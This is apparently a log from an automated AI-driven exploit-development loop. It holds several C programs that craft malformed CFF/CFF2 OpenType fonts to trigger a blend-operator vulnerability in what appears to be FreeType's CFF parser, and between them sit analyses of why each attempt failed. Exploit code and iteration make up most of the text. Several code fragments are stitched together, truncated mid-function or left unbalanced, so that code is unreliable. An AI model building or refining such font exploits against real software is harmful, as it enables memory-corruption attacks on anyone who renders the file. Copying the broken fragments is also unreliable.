    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

Senior Engineer Analysis:
[CRITIC WARNING] The critic attempted to rewrite the generator code instead of providing diagnostic analysis. Focus on understanding WHY the payload failed, not on writing replacement code.

## Root Cause

The previous PoC failed because it tried to push **101 blend operands** (203 stack entries) onto the CFF2 parser stack, but the parser stack is **fixed at 193 entries** (`CFF2_DEFAULT_STACK`). The `maxstack` operator only modifies `dict->maxstack` but **does not resize the actual stack buffer** – the overflow check in `cff_parser_run` uses the original `stackSize` (193). Thus, the blend operator is never reached; a `Stack_Overflow` error occurs instead.

## Required Changes

1. **Reduce `numBlends`** so tha

#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f); /* sfVersion = 'OTTO' */
    write_uint16(f, 2);  /* numTables = 2 */
    write_uint16(f, 0);  /* searchRange */
    write_uint16(f, 0);  /* entrySelector */
    write_uint16(f, 0);  /* rangeShift */

    /* ========== Table 1: CFF2 ========== */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long cff2_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* ========== CFF2 data ========== */
    long cff2_start = ftell(f);

    /* CFF2 Header: 5 bytes */
    fputc(0x02, f); /* major */
    fputc(0x00, f); /* minor */
    fputc(0x05, f); /* hdrSize */

    /* topDictLength (2 bytes) - placeholder */
    long tdl_pos = ftell(f);
    write_uint16(f, 0);

    /* ========== Top DICT ========== */
    long topdict_start = ftell(f);

    /* Version (SID 0) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x00, f); /* operator 0 = version */

    /* FDSelect: push offset, then escaped 12 30 */
    long fdselect_offset_pos = ftell(f);
    fputc(0x28, f); /* 4-byte integer prefix */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); /* escape */
    fputc(0x1E, f); /* FDSelect = 12 30 */

    /* CharStrings: push offset, then escaped 17 */
    long charstrings_offset_pos = ftell(f);
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f); /* CharStrings = 17 */

    /* FDArray: push offset, then escaped 12 36 */
    long fdarray_offset_pos = ftell(f);
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); /* escape */
    fputc(0x24, f); /* FDArray = 12 36 */

    long topdict_end = ftell(f);
    long topdict_len = topdict_end - topdict_start;

    /* Patch topDictLength */
    fseek(f, tdl_pos, SEEK_SET);
    write_uint16(f, (uint16_t)topdict_len);
    fseek(f, topdict_end, SEEK_SET);

    /* ========== Global Subr INDEX (empty) ========== */
    write_uint32(f, 0); /* count = 0 */

    /* ========== FDSelect ========== */
    long fdselect_start = ftell(f);
    long fdselect_offset_from_cff2 = fdselect_start - cff2_start;

    fseek(f, fdselect_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdselect_offset_from_cff2 >> 24) & 0xff, f);
    fputc((fdselect_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdselect_offset_from_cff2 >> 8) & 0xff, f);
    fputc(fdselect_offset_from_cff2 & 0xff, f);
    fseek(f, fdselect_start, SEEK_SET);

    /* FDSelect format 0: 1 glyph, FD index 0 */
    fputc(0x00, f);              /* format = 0 */
    write_uint16(f, 1);          /* nGlyphs = 1 */
    fputc(0x00, f);              /* fdArray[0] = 0 */

    /* ========== CharStrings INDEX ========== */
    long charstrings_start = ftell(f);
    long charstrings_offset_from_cff2 = charstrings_start - cff2_start;

    fseek(f, charstrings_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((charstrings_offset_from_cff2 >> 24) & 0xff, f);
    fputc((charstrings_offset_from_cff2 >> 16) & 0xff, f);
    fputc((charstrings_offset_from_cff2 >> 8) & 0xff, f);
    fputc(charstrings_offset_from_cff2 & 0xff, f);
    fseek(f, charstrings_start, SEEK_SET);

    /* CharStrings INDEX: 1 glyph */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */
    fputc(0x8B, f);     /* push 0 */
    fputc(0x0E, f);     /* endchar = 14 */

    /* ========== FDArray INDEX ========== */
    long fdarray_start = ftell(f);
    long fdarray_offset_from_cff2 = fdarray_start - cff2_start;

    fseek(f, fdarray_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdarray_offset_from_cff2 >> 24) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 8) & 0xff, f);
    fputc(fdarray_offset_from_cff2 & 0xff, f);
    fseek(f, fdarray_start, SEEK_SET);

    /* FDArray INDEX: 1 Font DICT */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */

    long fontdict_start = ftell(f);

    /* Private DICT operator */
    long private_offset_pos = ftell(f);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f); /* Private operator */

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    fseek(f, fontdict_start - 1, SEEK_SET);
    fputc((uint8_t)(fontdict_len + 1), f);
    fseek(f, fontdict_end, SEEK_SET);

    /* ========== Private DICT ========== */
    long private_start = ftell(f);
    long private_offset_from_cff2 = private_start - cff2_start;

    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: vsindex 0 (CFF2 opcode 0x16) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x16, f); /* vsindex = CFF2 code 22 */

    /* First blend: numBlends=10, then 10 pairs */
    fputc(0x99, f); /* push 10 (10+139=149=0x95) */
    int i;
    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    /* Second blend: numBlends=10, then 10 pairs */
    fputc(0x99, f); /* push 10 */
    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch Private DICT size */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc((uint8_t)(private_len + 139), f); /* push private_len */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    /* Patch CFF2 table record */
    fseek(f, cff2_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    /* ========== Table 2: fvar ========== */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long fvar_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* fvar table */
    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000); /* version 1.0 */
    write_uint16(f, 20); /* axes array size (one axis = 20 bytes) */
    write_uint16(f, 0);  /* instance count = 0 */
    write_uint16(f, 0);  /* instance size = 0 */

    /* Axis record: 'wght' */
    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
    write_fixed(f, 1.0);  /* min */
    write_fixed(f, 1.0);  /* default */
    write_fixed(f, 1.0);  /* max */
    write_uint16(f, 0);   /* flags */
    write_uint16(f, 0);   /* axisNameID */

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;

    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;
}
```

**LLM Response** (10,551 chars):
> ## Analysis  The previous payload failed because the CFF2 parser's `cff_parse_blend` function checks that `parser->top_only` is false before processing blend operators. In `cff_parser_run`, when parsing a Private DICT, the parser sets `parser->top_only = TRUE` by default for CFF2, because CFF2 Private DICTs are supposed to be parsed in a restricted mode. The `blend` operator (CFF2 code 23) is only...

#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);

}

    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    /* Private DICT operator (still needed for glyph loading) */

    fseek(f, fontdict_start - 1, SEEK_SET);

    fseek(f, fontdict_end, SEEK_SET);

    /* ========== Private DICT (empty) ========== */
    long private_start = ftell(f);
    long private_offset_from_cff2 = private_start - cff2_start;

    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x8B, f); /* size = 0 */

    fputc((private_offset_from_cff2 >> 24) & 0xff, f);

    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Empty Private DICT */

    long private_len = private_end - private_start;

    /* Patch Private DICT size */

    fputc((uint8_t)(private_len + 139), f); /* push private_len */

    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    /* Patch CFF2 table record */
    fseek(f, cff2_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    /* ========== Table 2: fvar ========== */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long fvar_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* fvar table */
    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000); /* version 1.0 */
    write_uint16(f, 20); /* axes array size (one axis = 20 bytes) */
    write_uint16(f, 0);  /* instance count = 0 */
    write_uint16(f, 0);  /* instance size = 0 */

    /* Axis record: 'wght' */
    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
    write_fixed(f, 1.0);  /* min */
    write_fixed(f, 1.0);  /* default */
    write_fixed(f, 1.0);  /* max */
    write_uint16(f, 0);   /* flags */
    write_uint16(f, 0);   /* axisNameID */

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;

    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;
}

The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
Based on my analysis of the source code, I now understand why the PoC failed.

## Root Cause Analysis

The **blend operator** (`op=23` in CFF2) can **only** be parsed in a **Private DICT** context. The critical check in `cff_parse_blend` (line 942 of cffparse.c) is:

```c
if ( !priv || !priv->subfont )
{
    error = FT_THROW( Invalid_File_Format );
    goto Exit;
}
```

When parsing the `FDArray` (Font DICTs), the `parser->object` is set to `CFF_FontRecDict` (the top-level font dictionary), NOT a `CFF_Private` structure. The field `CFF_FontRecDict` does not have a `subfont` member — only `CFF_Private` has one (as seen in `cfftypes.h:273: CFF_SubFont  subfont`). Therefore, when the blend operator is encountere
```

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f); /* sfVersion = 'OTTO' */

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f); /* sfVersion = 'OTTO' */
    write_uint16(f, 2);  /* numTables = 2 */
    write_uint16(f, 0);  /* searchRange */
    write_uint16(f, 0);  /* entrySelector */
    write_uint16(f, 0);  /* rangeShift */

    /* ========== Table 1: CFF1 ========== */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc(' ', f); /* tag = 'CFF ' */
    write_uint32(f, 0); /* checksum placeholder */
    long cff1_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* ========== CFF1 data ========== */
    long cff1_start = ftell(f);

    /* CFF1 Header: 4 bytes */
    fputc(0x01, f); /* major */
    fputc(0x00, f); /* minor */
    fputc(0x04, f); /* hdrSize */
    fputc(0x00, f); /* offSize */

    /* ========== Name INDEX (empty) ========== */
    write_uint16(f, 0); /* count = 0 */

    /* ========== Top DICT INDEX ========== */
    /* Top DICT: just version and FDArray */
    long topdict_index_start = ftell(f);
    write_uint16(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */

    long topdict_data_start = ftell(f);
    /* Version (SID 0) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x00, f); /* operator 0 = version */

    /* CharStrings: push offset (from start of CFF1 data), then operator 17 */
    long charstrings_offset_pos = ftell(f);
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f); /* CharStrings = 17 */

    /* FDArray: push offset, then escaped 12 36 */
    long fdarray_offset_pos = ftell(f);
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); /* escape */
    fputc(0x24, f); /* FDArray = 12 36 */

    long topdict_data_end = ftell(f);
    long topdict_data_len = topdict_data_end - topdict_data_start;

    /* Patch Top DICT INDEX offset[1] */
    fseek(f, topdict_data_start - 1, SEEK_SET);
    fputc((uint8_t)(topdict_data_len + 1), f);
    fseek(f, topdict_data_end, SEEK_SET);

    /* ========== String INDEX (empty) ========== */
    write_uint16(f, 0); /* count = 0 */

    /* ========== Global Subr INDEX (empty) ========== */
    write_uint16(f, 0); /* count = 0 */

    /* ========== CharStrings INDEX ========== */
    long charstrings_start = ftell(f);
    long charstrings_offset_from_cff1 = charstrings_start - cff1_start;

    fseek(f, charstrings_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((charstrings_offset_from_cff1 >> 24) & 0xff, f);
    fputc((charstrings_offset_from_cff1 >> 16) & 0xff, f);
    fputc((charstrings_offset_from_cff1 >> 8) & 0xff, f);
    fputc(charstrings_offset_from_cff1 & 0xff, f);
    fseek(f, charstrings_start, SEEK_SET);

    /* CharStrings INDEX: 1 glyph */
    write_uint16(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */
    fputc(0x8B, f);     /* push 0 */
    fputc(0x0E, f);     /* endchar = 14 */

    /* ========== FDArray INDEX ========== */
    long fdarray_start = ftell(f);
    long fdarray_offset_from_cff1 = fdarray_start - cff1_start;

    fseek(f, fdarray_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdarray_offset_from_cff1 >> 24) & 0xff, f);
    fputc((fdarray_offset_from_cff1 >> 16) & 0xff, f);
    fputc((fdarray_offset_from_cff1 >> 8) & 0xff, f);
    fputc(fdarray_offset_from_cff1 & 0xff, f);
    fseek(f, fdarray_start, SEEK_SET);

    /* FDArray INDEX: 1 Font DICT (CFF1: 16-bit count) */
    write_uint16(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */

    long fontdict_start = ftell(f);

    /* Private DICT operator */
    long private_offset_pos = ftell(f);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f); /* Private operator */

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    fseek(f, fontdict_start - 1, SEEK_SET);
    fputc((uint8_t)(fontdict_len + 1), f);
    fseek(f, fontdict_end, SEEK_SET);

    /* ========== Private DICT ========== */
    long private_start = ftell(f);
    long private_offset_from_cff1 = private_start - cff1_start;

    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc((private_offset_from_cff1 >> 24) & 0xff, f);
    fputc((private_offset_from_cff1 >> 16) & 0xff, f);
    fputc((private_offset_from_cff1 >> 8) & 0xff, f);
    fputc(private_offset_from_cff1 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: vsindex 0 (CFF1 escaped opcode 12 31) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x0C, f); /* escape */
    fputc(0x1F, f); /* vsindex = 12 31 */

    /* First blend: numBlends=10, then 10 pairs (CFF1 escaped opcode 12 22) */
    fputc(0x99, f); /* push 10 */
    int i;
    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    /* Second blend: numBlends=10, then 10 pairs */
    fputc(0x99, f); /* push 10 */
    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x0C, f); /* escape */
    fputc(0x16, f); /* blend = 12 22 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch Private DICT size */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc((uint8_t)(private_len + 139), f); /* push private_len */
    fputc(0x28, f);
    fputc((private_offset_from_cff1 >> 24) & 0xff, f);
    fputc((private_offset_from_cff1 >> 16) & 0xff, f);
    fputc((private_offset_from_cff1 >> 8) & 0xff, f);
    fputc(private_offset_from_cff1 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    long cff1_end = ftell(f);
    long cff1_len = cff1_end - cff1_start;

    /* Patch CFF1 table record */
    fseek(f, cff1_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff1_start);
    write_uint32(f, (uint32_t)cff1_len);

    /* ========== Table 2: fvar ========== */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long fvar_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* fvar table */
    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000); /* version 1.0 */
    write_uint16(f, 20); /* axes array size (one axis = 20 bytes) */
    write_uint16(f, 0);  /* instance count = 0 */
    write_uint16(f, 0);  /* instance size = 0 */

    /* Axis record: 'wght' */
    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
    write_fixed(f, 1.0);  /* min */
    write_fixed(f, 1.0);  /* default */
    write_fixed(f, 1.0);  /* max */
    write_uint16(f, 0);   /* flags */
    write_uint16(f, 0);   /* axisNameID */

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;

    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;
}

The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Root Cause Analysis

The PoC failed because the `blend` operator (12 22) in CFF1 **requires** that `blend->lenBV > 0`, meaning a valid blend vector must have been set up by a prior `vsindex` operator (12 31). However, the critical issue is that `cff_parse_blend` at line 901 calls `cff_blend_build_vector()` **before** calling `cff_blend_doBlend()`.

When `cff_blend_build_vector()` is called with `vsindex=0`, it checks `blend->lenBV` which will be 0 (uninitialized). Let me trace the exact failure path:

1. **Line 895-903 of cffparse.c**: `cff_parse_blend` calls `cff_blend_build_vector()` which requires `blend->vstore` (variation store) to be set up. In a CFF1-only font without an `fvar` table providing actua
```

**LLM Response** (10,877 chars):
> ## Analysis  The previous payload used CFF1 format, but CFF1's `cff_parse_blend` requires `blend->lenBV > 0` and a valid `blend->vstore`, which only gets populated when a CFF2 VariationStore is present. CFF1 does not natively support blend in Private DICTs — the blend operator (12 22) in CFF1 is only valid in charstrings, not in DICTs. The vulnerability description explicitly mentions `cff_blend_d...

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f); /* sfVersion = 'OTTO' */
    write_uint16(f, 2);  /* numTables = 2 */
    write_uint16(f, 0);  /* searchRange */
    write_uint16(f, 0);  /* entrySelector */
    write_uint16(f, 0);  /* rangeShift */

    write_uint32(f, 0); /* length placeholder */

    long cff2_start = ftell(f);

    /* CFF2 Header: exactly 5 bytes */
    fputc(0x02, f); /* major */
    fputc(0x00, f); /* minor */
    fputc(0x05, f); /* hdrSize */

    /* topDictLength (2 bytes) - placeholder */
    long tdl_pos = ftell(f);
    write_uint16(f, 0);

    /* ========== Top DICT ========== */
    long topdict_start = ftell(f);

    fputc(0x0C, f); /* escape */
    fputc(0x1E, f); /* FDSelect = 12 30 */

    fputc(0x11, f); /* CharStrings = 17 */

    /* FDArray: push offset, then escaped 12 36 */
    long fdarray_offset_pos = ftell(f);
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); /* escape */
    fputc(0x24, f); /* FDArray = 12 36 */

    long topdict_end = ftell(f);
    long topdict_len = topdict_end - topdict_start;

    /* Patch topDictLength */
    fseek(f, tdl_pos, SEEK_SET);
    write_uint16(f, (uint16_t)topdict_len);
    fseek(f, topdict_end, SEEK_SET);

    /* ========== Global Subr INDEX (empty) ========== */
    write_uint32(f, 0); /* count = 0 */

    fseek(f, fdselect_start, SEEK_SET);

    fputc(0x00, f);              /* format = 0 */

    fputc(0x01, f);     /* offset[0] = 1 */

    long fontdict_start = ftell(f);

    /* Font DICT: just Private operator */
    long private_offset_pos = ftell(f);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f); /* Private operator */

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    fseek(f, fontdict_start - 1, SEEK_SET);
    fputc((uint8_t)(fontdict_len + 1), f);
    fseek(f, fontdict_end, SEEK_SET);

    /* ========== Private DICT ========== */
    long private_start = ftell(f);
    long private_offset_from_cff2 = private_start - cff2_start;

    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x8B, f); /* size placeholder */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: vsindex 0 (CFF2 opcode 0x16) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x16, f); /* vsindex = CFF2 code 22 */

    /* First blend: numBlends=10, then 10 pairs (CFF2 opcode 0x17) */
    fputc(0x99, f); /* push 10 */
    int i;
    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */

    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

